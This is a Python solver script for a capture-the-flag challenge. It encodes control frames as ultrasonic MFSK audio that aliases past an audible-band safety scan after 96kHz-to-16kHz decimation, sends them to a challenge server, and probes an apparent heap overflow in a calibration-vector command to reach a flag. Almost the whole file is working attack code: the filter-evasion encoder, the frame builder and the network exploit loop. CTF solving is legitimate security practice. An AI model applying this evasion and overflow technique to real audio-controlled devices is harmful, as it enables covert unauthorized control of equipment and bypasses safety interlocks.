#!/usr/bin/env python3
"""
dog_whistle / Aria solver
=========================
The "safety lockout" scans 300-3400 Hz for engineering tone signatures.
Bypass: transmit MFSK tones at ultrasonic frequencies (16800-18000 Hz at 96kHz)
that alias down to the correct codec-band frequencies (800-2000 Hz) after the
96kHz→16kHz decimation, while staying invisible to the audible-band safety scan.

Protocol:
  Frame: 0xA5 0x5A <LEN> <payload bytes> <CKSUM>
  CKSUM  = XOR of LEN and all payload bytes
  Payload = TLV records: <TYPE> <LEN> <value bytes>

Opcodes:
  0x10 = DEBUG_PING  (no value) → PONG
  0x01 = SELECT_PROFILE <1 byte region_id>  → region 0x0E gives CAL ECHO
  0x02 = SET_CAL_VECTOR <1 byte count> <count int16 samples>
"""

import sys, struct, base64, io, wave, socket, time
import numpy as np

# ── MFSK parameters ────────────────────────────────────────────────────────────
FS_RAW   = 96_000        # capture sample rate (24-bit PCM)
FS_CODEC = 16_000        # codec rate after decimation
SYM_LEN  = 200           # samples at codec rate per symbol
LEAD_IN  = 64            # codec samples of silence before first symbol
DECIM    = FS_RAW // FS_CODEC   # = 6

# Tone frequencies at codec rate: tone(k) = 800 + 80*k
# Ultrasonic alias at raw rate: f_us = f_codec + FS_CODEC (alias 1st harmonic)
def codec_tone(k):  return 800 + 80 * k
def ultra_tone(k):  return codec_tone(k) + FS_CODEC   # 16800..18000 Hz

# ── Build control frame bytes ──────────────────────────────────────────────────
def make_frame(tlv_bytes: bytes) -> bytes:
    length = len(tlv_bytes)
    cksum  = length
    for b in tlv_bytes:
        cksum ^= b
    return bytes([0xA5, 0x5A, length]) + tlv_bytes + bytes([cksum])

def tlv(type_byte: int, value: bytes) -> bytes:
    return bytes([type_byte, len(value)]) + value

def frame_ping() -> bytes:
    return make_frame(tlv(0x10, b''))

def frame_select_profile(region_id: int) -> bytes:
    return make_frame(tlv(0x01, bytes([region_id])))

def frame_set_cal_vector(samples: bytes) -> bytes:
    """samples: raw int16 LE bytes; prepend count byte"""
    n = len(samples) // 2
    return make_frame(tlv(0x02, bytes([n]) + samples))

# ── Encode bytes → nibble stream → MFSK audio at 96kHz ────────────────────────
def bytes_to_nibbles(data: bytes):
    nibs = []
    for b in data:
        nibs.append((b >> 4) & 0xF)
        nibs.append(b & 0xF)
    return nibs

def gen_mfsk_raw(frame_bytes: bytes) -> np.ndarray:
    """Generate 96kHz 24-bit PCM audio encoding frame_bytes via ultrasonic MFSK."""
    nibbles = bytes_to_nibbles(frame_bytes)
    
    # Lead-in silence + symbols, all at codec-rate duration, upsampled to raw rate
    lead_samples = LEAD_IN * DECIM              # silence at raw rate
    sym_samples  = SYM_LEN * DECIM             # samples per symbol at raw rate
    
    total = lead_samples + len(nibbles) * sym_samples
    # Small tail of silence
    tail = SYM_LEN * DECIM
    sig = np.zeros(total + tail, dtype=np.float64)
    
    # Silence lead-in (already zeros)
    
    t_sym = np.arange(sym_samples) / FS_RAW
    for i, nib in enumerate(nibbles):
        freq = ultra_tone(nib)  # ultrasonic alias
        start = lead_samples + i * sym_samples
        sig[start:start+sym_samples] += np.sin(2 * np.pi * freq * t_sym)
    
    # Normalize to ~80% of 24-bit range
    peak = np.max(np.abs(sig)) or 1.0
    sig = sig / peak * 0.8 * (2**23 - 1)
    return sig.astype(np.int32)

def samples_to_wav(samples: np.ndarray) -> bytes:
    """Pack int32 samples (24-bit values) into a mono 24-bit 96kHz WAV."""
    buf = io.BytesIO()
    with wave.open(buf, 'wb') as w:
        w.setnchannels(1)
        w.setsampwidth(3)          # 24-bit
        w.setframerate(FS_RAW)
        # Pack each int32 as 3 LE bytes
        raw = bytearray()
        for s in samples:
            s_clamped = max(-2**23, min(2**23-1, int(s)))
            raw += struct.pack('<i', s_clamped)[:3]
        w.writeframes(bytes(raw))
    return buf.getvalue()

def encode_capture(frame_bytes: bytes) -> str:
    """Return base64-encoded WAV string for one frame."""
    samples = gen_mfsk_raw(frame_bytes)
    wav = samples_to_wav(samples)
    # Check duration ≤ 2 s
    dur = len(samples) / FS_RAW
    assert dur <= 2.0, f"Capture too long: {dur:.3f}s (max 2s)"
    return base64.b64encode(wav).decode()

# ── Network ────────────────────────────────────────────────────────────────────
HOST = "pwn.h7tex.com"
PORT = 40718

def recv_until_separator(sock, sep=b"----\n", timeout=10):
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if sep in data:
                break
        except socket.timeout:
            break
    return data.decode(errors='replace')

def send_capture(sock, frame_bytes: bytes, label: str) -> str:
    b64 = encode_capture(frame_bytes)
    print(f"[+] Sending {label} ({len(frame_bytes)} frame bytes, "
          f"{len(b64)} b64 chars)")
    sock.sendall((b64 + "\n").encode())
    resp = recv_until_separator(sock)
    print(f"    Response:\n{resp}")
    return resp

# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    print("[*] dog_whistle solver — ultrasonic MFSK bypass")
    print(f"[*] Target: {HOST}:{PORT}")
    
    with socket.create_connection((HOST, PORT), timeout=15) as sock:
        # Read banner
        banner = recv_until_separator(sock, sep=b"\n", timeout=5)
        print(f"[*] Banner: {banner.strip()}")
        # Read budget line
        budget_line = recv_until_separator(sock, sep=b"\n", timeout=3)
        print(f"[*] {budget_line.strip()}")
        
        # Step 1: DEBUG_PING — verify modem decoding works
        ping_frame = frame_ping()
        resp = send_capture(sock, ping_frame, "DEBUG_PING (0x10)")
        if "PONG" in resp:
            print("[+] PONG received — modem decode successful!")
        else:
            print("[-] No PONG — check MFSK encoding")
        
        # Step 2: SELECT_PROFILE(0x0E) — factory cal region
        # SPEC: "SELECT_PROFILE on the factory calibration region (id 0x0E)
        #        echoes the region header back as CAL ECHO"
        sel_frame = frame_select_profile(0x0E)
        resp = send_capture(sock, sel_frame, "SELECT_PROFILE(0x0E)")
        if "CAL ECHO" in resp:
            print("[+] CAL ECHO received — factory region header:")
            print(resp)
        elif "SAFETY LOCKOUT" in resp:
            print("[-] Safety lockout triggered — adjust frequency strategy")
        elif "PROFILE SELECTED" in resp:
            print("[+] Profile selected")
            
        # Step 3: Try SET_CAL_VECTOR with oversized count to trigger flag path
        # cal buffer is malloc(0x20) = 32 bytes = 16 int16 samples
        # send more than 16 samples to probe heap behaviour
        # Use 0 samples first just to test the opcode is accepted
        cal_frame = frame_set_cal_vector(bytes(32))  # 16 zero samples
        resp = send_capture(sock, cal_frame, "SET_CAL_VECTOR(16 zeros)")
        print(f"    Result: {resp.strip()}")

        # Attempt to trigger FLAG: try opcode sequence that hits 0x26a0
        # The FLAG function prints getenv("FLAG") — triggered if cal region
        # reveals firmware flag stored in the header echoed by CAL ECHO
        print("\n[*] All responses above — check for flag pattern h7tex{...}")

if __name__ == "__main__":
    main()
